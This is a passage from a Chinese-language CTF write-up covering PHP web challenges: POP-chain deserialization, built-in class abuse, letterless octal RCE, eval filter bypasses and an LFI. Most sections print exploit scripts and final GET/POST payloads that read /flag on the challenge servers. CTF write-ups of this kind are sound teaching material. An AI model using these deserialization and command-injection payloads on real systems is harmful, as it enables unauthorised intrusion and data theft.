+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">throw new Exception(&quot;noooooob!!!&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>NewStarCTF出过类似的题，直接用array($c, null)得到一个数组</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:2:&#123;i:0;O:3:&quot;CCC&quot;:1:&#123;s:1:&quot;c&quot;;O:3:&quot;AAA&quot;:2:&#123;s:1:&quot;s&quot;;O:3:&quot;CCC&quot;:2:&#123;s:1:&quot;c&quot;;s:6:&quot;metsys&quot;;s:1:&quot;d&quot;;s:9:&quot;cat /flag&quot;;&#125;s:1:&quot;a&quot;;s:1:&quot;c&quot;;&#125;&#125;i:1;N;&#125; </span><br></pre></td></tr></table></figure>
+
+<p>再把它改成一个非法数组，即最后一个1改成0</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:2:&#123;i:0;O:3:&quot;CCC&quot;:1:&#123;s:1:&quot;c&quot;;O:3:&quot;AAA&quot;:2:&#123;s:1:&quot;s&quot;;O:3:&quot;CCC&quot;:2:&#123;s:1:&quot;c&quot;;s:6:&quot;metsys&quot;;s:1:&quot;d&quot;;s:9:&quot;cat /flag&quot;;&#125;s:1:&quot;a&quot;;s:1:&quot;c&quot;;&#125;&#125;i:0;N;&#125; // 最后一个1改成0 </span><br></pre></td></tr></table></figure>
+
+<p>即可在throw报错之前执行反序列化</p>
+<p>exploit：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;? php</span><br><span class="line"></span><br><span class="line">//题目源码放在这里</span><br><span class="line"></span><br><span class="line">$c = new CCC();</span><br><span class="line">$c -&gt; c = new AAA();</span><br><span class="line">$c -&gt; c -&gt; s = new BBB();</span><br><span class="line">$c -&gt; c -&gt; a = &#x27;hacku&#x27;;</span><br><span class="line">$c -&gt; c -&gt; s -&gt; c = &#x27;metsys&#x27;;</span><br><span class="line">$c -&gt; c -&gt; s -&gt; d = &#x27;cat /flag&#x27;;</span><br><span class="line">$exp = array($c, null);</span><br><span class="line">echo serialize($exp);</span><br></pre></td></tr></table></figure>
+
+<p>再把输出的内容做如上文的修改即可</p>
+<p>简单吧？提交payload之后就可以拿flag庆祝一下了</p>
+<p><strong>最终payload</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET: ?xy=a:2:&#123;i:0;O:3:%22CCC%22:1:&#123;s:1:%22c%22;O:3:%22AAA%22:2:&#123;s:1:%22s%22;O:3:%22BBB%22:2:&gt; &#123;s:1:%22c%22;s:6:%22metsys%22;s:1:%22d%22;s:9:%22cat%20/flag%22;&#125;s:1:%22a%22;s:5:%22hacku%22;&#125;&#125;i:0;N;&#125;</span><br><span class="line">POST: a=implode&amp;b=strrev</span><br></pre></td></tr></table></figure>
+
+<p>总结：ezpop！但是构造那里挺新颖的，好题！</p>
+<h2 id="ezclass"><a href="#ezclass" class="headerlink" title="ezclass"></a>ezclass</h2><p>难度：签到</p>
+<p>这题后来拿手机做的（打ctf上瘾了）但是手机那边的操作真的是给我搞红温了（尤其是wss的客户端我还得用termux下linux版的wss巨麻烦）最后只好找个签到难度的题做了（））</p>
+<p>进来又是代码跳杀：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$a=$_GET[&#x27;a&#x27;];</span><br><span class="line">$aa=$_GET[&#x27;aa&#x27;];</span><br><span class="line">$b=$_GET[&#x27;b&#x27;];</span><br><span class="line">$bb=$_GET[&#x27;bb&#x27;];</span><br><span class="line">$c=$_GET[&#x27;c&#x27;];</span><br><span class="line">((new $a($aa))-&gt;$c())((new $b($bb))-&gt;$c());</span><br></pre></td></tr></table></figure>
+
+<p>PHP里面有内置类，其中Error::getMessage方法可以返回Error类实例化时接受的字符串</p>
+<p>可以看：<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/error.getmessage.php">https://www.php.net/manual/zh/error.getmessage.php</a></p>
+<p>所以基本思路就是创建两个error类分别给system和cat &#x2F;flag两个参数，再用getMessage方法把输进去的参数当作字符串返回</p>
+<p>示例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET: ?a=Error&amp;aa=system&amp;c=getMessage&amp;b=Error&amp;bb=ls</span><br></pre></td></tr></table></figure>
+
+<p>等同于：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((new Error(&#x27;system&#x27;))-&gt;getMessage())((new $Error(&#x27;ls&#x27;))-&gt;getMessage());</span><br></pre></td></tr></table></figure>
+
+<p>等同于：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(&#x27;ls&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>构造payload拿到flag</p>
+<p><strong>最终payload</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET: ?a=Error&amp;aa=system&amp;c=getMessage&amp;b=Error&amp;bb=cat%20/flag</span><br></pre></td></tr></table></figure>
+
+<h2 id="ezRCE"><a href="#ezRCE" class="headerlink" title="ezRCE"></a>ezRCE</h2><p>难度：热身甚至是简单</p>
+<p>进来又是代码跳杀</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">function waf($cmd)&#123;</span><br><span class="line">    $white_list = [&#x27;0&#x27;,&#x27;1&#x27;,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;4&#x27;,&#x27;5&#x27;,&#x27;6&#x27;,&#x27;7&#x27;,&#x27;8&#x27;,&#x27;9&#x27;,&#x27;\\&#x27;,&#x27;\&#x27;&#x27;,&#x27;$&#x27;,&#x27;&lt;&#x27;]; </span><br><span class="line">    $cmd_char = str_split($cmd);</span><br><span class="line">    foreach($cmd_char as $char)&#123;</span><br><span class="line">        if (!in_array($char, $white_list))&#123;</span><br><span class="line">            die(&quot;really ez?&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return $cmd;</span><br><span class="line">&#125;</span><br><span class="line">$cmd=waf($_GET[&quot;cmd&quot;]);</span><br><span class="line">system($cmd);</span><br><span class="line">really ez?</span><br></pre></td></tr></table></figure>
+
+<p>一眼无字母RCE，典中典了属于是，八进制绕过就好</p>
+<p><em>知识点：linux中使用$’xxx’（xxx为字符的八进制）的形式可以执行任意代码</em></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#x27;\154\163&#x27; //执行ls</span><br></pre></td></tr></table></figure>
+
+<p>发现可以成功执行</p>
+<p>但是八进制的执行方法不能执行带有参数的linux命令，如cat &#x2F;flag(&#x2F;flag为参数)或ls -la(-la为参数)</p>
+<p>具体原因参照bash的单词分割机制</p>
+<p>但是出题人还是想给我们flag的，网开一面留了个’&lt;’号</p>
+<p>众所周知，重定向符号可以代替命令中的空格</p>
+<p>所以payload就浮出水面啦！</p>
+<p><strong>最终payload</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#x27;\143\141\164&#x27;&lt;$&#x27;\57\146\154\141\147&#x27; // cat&lt;/flag</span><br></pre></td></tr></table></figure>
+
+<p>总结：如果对&lt;的用法不太熟悉的话可能会出现很多相似的payload然后没有回显，那可太让人恶心了</p>
+<h2 id="ezSerialize"><a href="#ezSerialize" class="headerlink" title="ezSerialize"></a>ezSerialize</h2><p>pop链这种东西比较单一，一旦会了做起来很快的。如果你是小白的话不建议从这里开始学，我这里把exploit贴上就差不多得了我真不想写了（plzplzplz）</p>
+<p>level1：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#x27;flag.php&#x27;;</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">class Flag &#123;</span><br><span class="line">    public $token;</span><br><span class="line">    public $password;</span><br><span class="line"></span><br><span class="line">    public function __construct($a, $b)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;token = $a;</span><br><span class="line">        $this-&gt;password = $b;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function login()</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;token === $this-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;pop&#x27;])) &#123;</span><br><span class="line">    $pop = unserialize($_GET[&#x27;pop&#x27;]);</span><br><span class="line">    $pop-&gt;token=md5(mt_rand());</span><br><span class="line">    if($pop-&gt;login()) &#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>哎呀这不ctfshow原题吗，一摸一样啊，就把类名改成Flag了有点抽象</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Kracxi/article/details/122887126">https://blog.csdn.net/Kracxi/article/details/122887126</a></p>
+<p>我懒得写了（bushi）核心知识点就是用&amp;让两个参数指向同一个地址，这样token变password跟着变</p>
+<p>exploit:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Flag&#123;</span><br><span class="line">    public $token;</span><br><span class="line">    public $password;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;token=&#x27;a&#x27;;</span><br><span class="line">        $this-&gt;password =&amp;$this-&gt;token;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=new Flag();</span><br><span class="line">echo urlencode(serialize($a));</span><br></pre></td></tr></table></figure>
+
+<p>提交给pop变量</p>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET：pop=O%3A4%3A&quot;Flag&quot;%3A2%3A%7Bs%3A5%3A&quot;token&quot;%3Bs%3A1%3A&quot;a&quot;%3Bs%3A8%3A&quot;password&quot;%3BR%3A2%3B%7D</span><br></pre></td></tr></table></figure>
+
+<p>进入fpclosefpclosefpcloseffflllaaaggg.php</p>
+<p>level2:</p>
+<p>看到还有level2有点难绷</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">class A &#123;</span><br><span class="line">    public $mack;</span><br><span class="line">    public function __invoke()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;mack-&gt;nonExistentMethod();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class B &#123;</span><br><span class="line">    public $luo;</span><br><span class="line">    public function __get($key)&#123;</span><br><span class="line">        echo &quot;o.O&lt;br&gt;&quot;;</span><br><span class="line">        $function = $this-&gt;luo;</span><br><span class="line">        return $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class C &#123;</span><br><span class="line">    public $wang1;</span><br><span class="line"></span><br><span class="line">    public function __call($wang1,$wang2)</span><br><span class="line">    &#123;</span><br><span class="line">            include &#x27;flag.php&#x27;;</span><br><span class="line">            echo $flag2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class D &#123;</span><br><span class="line">    public $lao;</span><br><span class="line">    public $chen;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        echo &quot;O.o&lt;br&gt;&quot;;</span><br><span class="line">        return is_null($this-&gt;lao-&gt;chen) ? &quot;&quot; : $this-&gt;lao-&gt;chen;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class E &#123;</span><br><span class="line">    public $name = &quot;xxxxx&quot;;</span><br><span class="line">    public $num;</span><br><span class="line"></span><br><span class="line">    public function __unserialize($data)</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;&lt;br&gt;学到就是赚到!&lt;br&gt;&quot;;</span><br><span class="line">        echo $data[&#x27;num&#x27;];</span><br><span class="line">    &#125;</span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        if($this-&gt;name!=&#x27;&#x27; || $this-&gt;num!=&#x27;&#x27;)&#123;</span><br><span class="line">            echo &quot;旅行者别忘记旅行的意义!&lt;br&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_POST[&#x27;pop&#x27;])) &#123;</span><br><span class="line">    unserialize($_POST[&#x27;pop&#x27;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>又臭又长的pop链啊（悲）</p>
+<p>exploit:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//题目源码放在这里</span><br><span class="line">$e = new E();</span><br><span class="line">$e -&gt; num = new D();</span><br><span class="line">$e -&gt; name = &#x27;&#x27;;</span><br><span class="line">$e -&gt; num -&gt; lao = new B();</span><br><span class="line">$e -&gt; num -&gt; chen = &#x27;e&#x27;;</span><br><span class="line">$e -&gt; num -&gt; lao -&gt; luo = new A();</span><br><span class="line">$e -&gt; num -&gt; lao -&gt; luo -&gt; mack = new C();</span><br><span class="line">$pop = serialize($e);</span><br><span class="line">echo $pop;</span><br></pre></td></tr></table></figure>
+
+<p>把输出交上去就行</p>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST: pop=O:1:&quot;E&quot;:2:&#123;s:4:&quot;name&quot;;s:0:&quot;&quot;;s:3:&quot;num&quot;;O:1:&quot;D&quot;:2:&#123;s:3:&quot;lao&quot;;O:1:&quot;B&quot;:1:&#123;s:3:&quot;luo&quot;;O:1:&quot;A&quot;:1:&#123;s:4:&quot;mack&quot;;O:1:&quot;C&quot;:1:&#123;s:5:&quot;wang1&quot;;N;&#125;&#125;&#125;s:4:&quot;chen&quot;;s:1:&quot;e&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>level2简简单单~~~</p>
+<p>进入saber_master_saber_master.php</p>
+<p>level3:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">// flag.php</span><br><span class="line">class XYCTFNO1</span><br><span class="line">&#123;</span><br><span class="line">    public $Liu;</span><br><span class="line">    public $T1ng;</span><br><span class="line">    private $upsw1ng;</span><br><span class="line"></span><br><span class="line">    public function __construct($Liu, $T1ng, $upsw1ng = Showmaker)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;Liu = $Liu;</span><br><span class="line">        $this-&gt;T1ng = $T1ng;</span><br><span class="line">        $this-&gt;upsw1ng = $upsw1ng;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class XYCTFNO2</span><br><span class="line">&#123;</span><br><span class="line">    public $crypto0;</span><br><span class="line">    public $adwa;</span><br><span class="line"></span><br><span class="line">    public function __construct($crypto0, $adwa)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;crypto0 = $crypto0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function XYCTF()</span><br><span class="line">    &#123;</span><br><span class="line">        if ($this-&gt;adwa-&gt;crypto0 != &#x27;dev1l&#x27; or $this-&gt;adwa-&gt;T1ng != &#x27;yuroandCMD258&#x27;) &#123;</span><br><span class="line">            return False;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return True;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class XYCTFNO3</span><br><span class="line">&#123;</span><br><span class="line">    public $KickyMu;</span><br><span class="line">    public $fpclose;</span><br><span class="line">    public $N1ght = &quot;Crypto0&quot;;</span><br><span class="line"></span><br><span class="line">    public function __construct($KickyMu, $fpclose)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;KickyMu = $KickyMu;</span><br><span class="line">        $this-&gt;fpclose = $fpclose;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function XY()</span><br><span class="line">    &#123;</span><br><span class="line">        if ($this-&gt;N1ght == &#x27;oSthing&#x27;) &#123;</span><br><span class="line">            echo &quot;WOW, You web is really good!!!\n&quot;;</span><br><span class="line">            echo new $_POST[&#x27;X&#x27;]($_POST[&#x27;Y&#x27;]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        if ($this-&gt;KickyMu-&gt;XYCTF()) &#123;</span><br><span class="line">            $this-&gt;XY();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;CTF&#x27;])) &#123;</span><br><span class="line">    unserialize($_GET[&#x27;CTF&#x27;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>跟上面一样构造链子</p>
+<p>构造执行直接用php原生类SplFileObject读&#x2F;flag就好</p>
+<p>注意：有个private属性序列化时候前后要加上%00</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET：CTF=O:8:&quot;XYCTFNO3&quot;:3:&#123;s:7:&quot;KickyMu&quot;;O:8:&quot;XYCTFNO2&quot;:2:&#123;s:7:&quot;crypto0&quot;;s:0:&quot;&quot;;s:4:&quot;adwa&quot;;O:8:&quot;XYCTFNO1&quot;:4:&#123;s:3:&quot;Liu&quot;;s:0:&quot;&quot;;s:4:&quot;T1ng&quot;;s:13:&quot;yuroandCMD258&quot;;s:17:&quot;%00XYCTFNO1%00upsw1ng&quot;;s:0:&quot;&quot;;s:7:&quot;crypto0&quot;;s:5:&quot;dev1l&quot;;&#125;&#125;s:7:&quot;fpclose&quot;;s:0:&quot;&quot;;s:5:&quot;N1ght&quot;;s:7:&quot;oSthing&quot;;&#125;</span><br><span class="line">POST: X=SplFileObject&amp;Y=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
+
+<p>然后base64解码就行</p>
+<p>总结：最无聊的一集，但写题到最后被夸了（WOW, You web is really good!!!）开心捏</p>
+<h2 id="牢牢记住，逝者为大"><a href="#牢牢记住，逝者为大" class="headerlink" title="牢牢记住，逝者为大"></a>牢牢记住，逝者为大</h2><p>孩子们，我回来了（信息课上写的哈哈哈哈哈）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">function Kobe($cmd)</span><br><span class="line">&#123;</span><br><span class="line">    if (strlen($cmd) &gt; 13) &#123;</span><br><span class="line">        die(&quot;see you again~&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if (preg_match(&quot;/echo|exec|eval|system|fputs|\.|\/|\\|/i&quot;, $cmd)) &#123;</span><br><span class="line">        die(&quot;肘死你&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    foreach ($_GET as $val_name =&gt; $val_val) &#123;</span><br><span class="line">        if (preg_match(&quot;/bin|mv|cp|ls|\||f|a|l|\?|\*|\&gt;/i&quot;, $val_val)) &#123;</span><br><span class="line">            return &quot;what can i say&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return $cmd;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$cmd = Kobe($_GET[&#x27;cmd&#x27;]);</span><br><span class="line">echo &quot;#man,&quot; . $cmd  . &quot;,manba out&quot;;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">eval(&quot;#man,&quot; . $cmd . &quot;,mamba out&quot;);</span><br></pre></td></tr></table></figure>
+
+<p><em>(1)cmd最长13个字符无法构造执行</em></p>
+<p>注意到没有过滤变量符号$，[]和_（注意力惊人），构造变量逃逸cmd的长度限制</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET：cmd=eval($_GET[1])&amp;1=system(&#x27;echo hacku&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>等效于</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET：cmd=eval(system(&#x27;echo hacku&#x27;));</span><br></pre></td></tr></table></figure>
+
+<p>能有效缩短长度，并且将命令执行的关键词逃逸到变量1里绕过专门对cmd的限制（长度，关键词等等）</p>
+<p>但是eval被过滤，加上长度限制，想到反引号RCE</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET：cmd=`$__GET[1]`;&amp;1=system(&#x27;echo hacku&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p><em>(2)绕过#符号让eval里的代码被执行而不是被当作注释忽略</em></p>
+<p>没了?&gt;&lt;?，但是%0a(换行符)一样可以越过#的限制，由此可得cmd里开头要有%0a</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET：cmd=%0a`$_GET[1]`;</span><br></pre></td></tr></table></figure>
+
+<p><em>(3)排除掉’,mamba out’的干扰</em></p>
+<p>直接以其治人之道还治其人之身，在cmd后面加#注释掉’,mamba out’</p>
+<p>%23为’#’的url编码，可得：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET：cmd=%0a`$_GET[1]`;%23</span><br></pre></td></tr></table></figure>
+
+<p><em>(4)绕过针对所有变量的过滤</em></p>
+<p>由于过滤了f所以不能用16进制绕过</p>
+<p>直接转8进制</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">143 160 040 057 146 154 141 147 040 150 141 143 153 165 056 164 170 164 012 // cp /flag hacku.txt的8进制</span><br></pre></td></tr></table></figure>
+
+<p><em>(5).RCE!!!</em></p>
+<p>$’’里面加上8进制就行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=%0a`$_GET[1]`;%23&amp;1=$&#x27;\143\160&#x27;+$&#x27;\57\146\154\141\147&#x27;+$&#x27;\040\150\141\143\153\165\056\164\170\164\012&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>总结：简单题，没过滤变量符号$和[]应该还算好意识到……吧，怎么总是感觉ctfshow出过这个题的样子</p>
+<h2 id="ezLFI-赛后复现"><a href="#ezLFI-赛后复现" class="headerlink" title="ezLFI(赛后复现)"></a>ezLFI(赛后复现)</h2><p>下载附件源码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php include_once($_REQUEST[&#x27;file&#x27;]);</span><br></pre></td></tr></table></figure>
+
+<p>诶呀这不filter链嘛</p>
+<p>贴别人的脚本秒了（））</p>
